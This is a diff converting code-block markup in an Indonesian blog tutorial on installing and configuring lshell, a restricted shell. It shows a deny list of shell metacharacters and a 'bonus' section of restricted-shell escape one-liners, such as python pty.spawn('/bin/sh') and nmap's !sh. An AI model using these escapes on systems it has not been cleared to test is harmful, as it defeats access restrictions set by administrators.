@@ -30,22 +30,25 @@ oke lanjut, installation :
 yup cara penggunaan :
 
 Switch User to LShell dengan command chsh atau change shell, ketik sudo chsh nama_user + enter
-Code:
+{% highlight bash %}
 ┌─[geek|plankton ~]
 └─$ sudo chsh geek
 Changing the login shell for geek
 Enter the new value, or press ENTER for the default
     Login Shell [/usr/bin/lshel]: /usr/bin/lshell
+{% endhighlight %}
+
 
 atau opsi lainnya kita bisa menambahkan user baru yang shell defaultnya menggunakan lshell, nih commandnya :
-Code:
+{% highlight bash %}
 $ sudo adduser --shell /usr/bin/lshell nama_user
-
+{% endhighlight %}
 
 Configure LShell :
 file konfigurasi lshell ada pada directory /etc/lshell.conf
 nih isinya :
-Code:
+
+{% highlight bash %}
 ┌─[geek|plankton ~]
 └─$ cat /etc/lshell.conf
 # lshell.py configuration file
@@ -161,6 +164,7 @@ allowed         : ['ls','echo','cd','ll']
 
 ##  a list of forbidden character or commands -- deny vim, as it allows to escape lshell
 forbidden       : [';', '&', '|','`','>','<', '$(', '${']
+{% endhighlight %}
 
 ------skip------
 
@@ -179,7 +183,7 @@ BONUS :
 
 Bypassing Shell :
 
-Code:
+{% highlight bash %}
 python -c 'import pty; pty.spawn("/bin/sh")'
 
 echo os.system('/bin/bash')
@@ -212,12 +216,16 @@ exec "/bin/sh"
 (From within nmap)
 
 !sh
+{% endhighlight %}
 
 semoga aja settingan lshell atau other shell bisa di spawn.. :p
 
 
 Referensi :
 https://packages.debian.org/wheezy/lshell
+
 https://tecadmin.net/how-to-limit-user-a...ted-shell/
+
 https://www.aldeid.com/wiki/Lshell
+
 https://netsec.ws/?p=337
